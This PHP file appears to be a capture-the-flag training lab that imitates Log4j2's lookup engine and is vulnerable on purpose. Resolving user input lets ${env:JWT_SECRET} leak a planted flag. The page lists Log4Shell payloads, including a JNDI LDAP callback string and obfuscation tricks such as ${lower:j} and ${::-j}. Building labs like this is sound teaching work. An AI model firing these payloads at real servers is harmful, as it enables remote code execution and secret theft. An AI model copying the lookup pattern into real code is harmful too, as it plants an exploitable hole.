<?php
/**
 * Log4j2 L1 — URL 参数注入（PHP 模拟 Log4j2 lookup 引擎）
 *
 * 漏洞原理：Log4j2 在日志中会将 ${...} 表达式解析为实际值。
 * 攻击者可以通过 ${env:SECRET} 读取敏感环境变量。
 *
 * 目标: 环境变量 JWT_SECRET = flag{jwt_signing_key_2b6d}
 * 攻击: ?name=${env:JWT_SECRET}
 */

// ---- Log4j2 Lookup 引擎模拟 ----
function log4j_resolve($input) {
    // 递归解析 ${...} 表达式，模拟 Log4j2 lookup 行为
    $maxDepth = 5;
    $changed = true;
    $result = $input;

    while ($changed && $maxDepth-- > 0) {
        $changed = false;
        $result = preg_replace_callback(
            '/\$\{([^}]+)\}/',
            function ($m) use (&$changed) {
                $expr = $m[1];
                // ${env:VAR} — 环境变量 lookup（核心漏洞）
                if (preg_match('/^env:(.+)$/i', $expr, $envM)) {
                    $val = getenv($envM[1]);
                    if ($val !== false) { $changed = true; return $val; }
                    return $m[0]; // 未解析，保留原样
                }
                // ${sys:property} — 系统属性（模拟）
                if (preg_match('/^sys:(.+)$/i', $expr, $sysM)) {
                    $changed = true;
                    $props = [
                        'user.dir' => '/opt/tomcat',
                        'java.home' => '/usr/lib/jvm/java-8-openjdk',
                        'os.name' => 'Linux',
                    ];
                    return $props[$sysM[1]] ?? $m[0];
                }
                // ${java:version} / ${java:runtime}
                if (preg_match('/^java:(.+)$/i', $expr, $jM)) {
                    $changed = true;
                    $javaProps = [
                        'version' => '1.8.0_301',
                        'runtime' => 'OpenJDK Runtime Environment (build 1.8.0_301-b09)',
                        'vm' => 'OpenJDK 64-Bit Server VM (build 25.301-b09, mixed mode)',
                    ];
                    return $javaProps[$jM[1]] ?? $m[0];
                }
                // ${lower:X} / ${upper:X} — 字符串变换（用于混淆绕过）
                if (preg_match('/^lower:(.+)$/i', $expr, $lM)) {
                    $changed = true;
                    return strtolower($lM[1]);
                }
                if (preg_match('/^upper:(.+)$/i', $expr, $uM)) {
                    $changed = true;
                    return strtoupper($uM[1]);
                }
                // ${::-X} — 空名默认值语法（Log4j2 特有的混淆技巧）
                if (preg_match('/^::-(.+)$/', $expr, $dM)) {
                    $changed = true;
                    return $dM[1];
                }
                // ${jndi:ldap://host/path} — JNDI 注入（模拟，不实际连接）
                if (preg_match('/^jndi:(.+)$/i', $expr, $jndiM)) {
                    $changed = true;
                    return "[JNDI:" . $jndiM[1] . "]";
                }
                return $m[0]; // 未知表达式，保留
            },
            $result
        );
    }
    return $result;
}

// ---- L1: URL 参数注入 ----
$name = $_GET['name'] ?? 'guest';

// ⚠️ 漏洞点: 用户输入经过 Log4j2 解析后输出
$resolved = log4j_resolve($name);

// 原始输入和解析结果都写入"日志"（响应中可见）
$cmdOutput = "LOG [INFO] UserLookup — input: $name | resolved: $resolved";
?>
<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <title>Log4j2 L1 - 参数注入</title>
    <style>
        body { font-family: monospace; max-width: 800px; margin: 50px auto; padding: 20px; background: #1a1a2e; color: #e0e0e0; }
        h2 { color: #e94560; }
        .info { background: #16213e; padding: 15px; border-radius: 5px; margin: 20px 0; border-left: 4px solid #e94560; }
        .code { background: #0f3460; padding: 10px; border-radius: 3px; color: #53d769; margin: 10px 0; font-size: 0.9em; }
        pre { background: #0f3460; padding: 15px; border-radius: 3px; color: #53d769; overflow-x: auto; white-space: pre-wrap; }
        input[type="text"] { width: 400px; padding: 10px; font-size: 14px; background: #0f3460; border: 1px solid #333; color: #e0e0e0; }
        input[type="submit"] { padding: 10px 20px; font-size: 14px; background: #e94560; border: none; color: white; cursor: pointer; }
    </style>
</head>
<body>
    <h2>🪵 Log4j2 L1 — URL 参数注入</h2>
    <div class="info">
        <strong>说明:</strong> 用户输入 <code>?name=</code> 参数经过 Log4j2 lookup 引擎解析后记录日志。<br>
        类似 CVE-2021-44228，<code>${...}</code> 表达式会被 Log4j2 解析成实际值。<br>
        <strong>目标:</strong> 使用 <code>${env:JWT_SECRET}</code> 语法泄露 JWT 签名密钥<br>
        <strong>成功标志:</strong> 日志输出中出现 <code>flag{...}</code><br>
        <strong>模拟引擎:</strong> PHP 实现了 Log4j2 的 env/sys/java/jndi/lower/upper/::- 等 lookup 语法
    </div>

    <div class="code">
        <strong>🔍 常用 Payload:</strong><br>
        <code>${env:JWT_SECRET}</code> — 泄露 JWT 签名密钥<br>
        <code>${java:version}</code> — 无害探针（信息收集）<br>
        <code>${${lower:j}ndi:ldap://callback/flag}</code> — 嵌套混淆 + JNDI<br>
        <code>${${::-j}${::-n}${::-d}${::-i}:ldap://callback/flag}</code> — 空名默认值混淆
    </div>

    <form method="GET">
        <input type="text" name="name" value="<?php echo htmlspecialchars($name); ?>" placeholder="例如: ${env:JWT_SECRET}">
        <input type="submit" value="Log4j2 Log">
    </form>

    <?php include '../success-banner.php'; ?>
    <h3>📋 日志输出:</h3>
    <pre><?php echo htmlspecialchars($resolved); ?></pre>

    <p><a href="../index.php" style="color:#53d769;">← 返回主页</a></p>
<?php include '../waf-status.php'; ?>
</body>
</html>
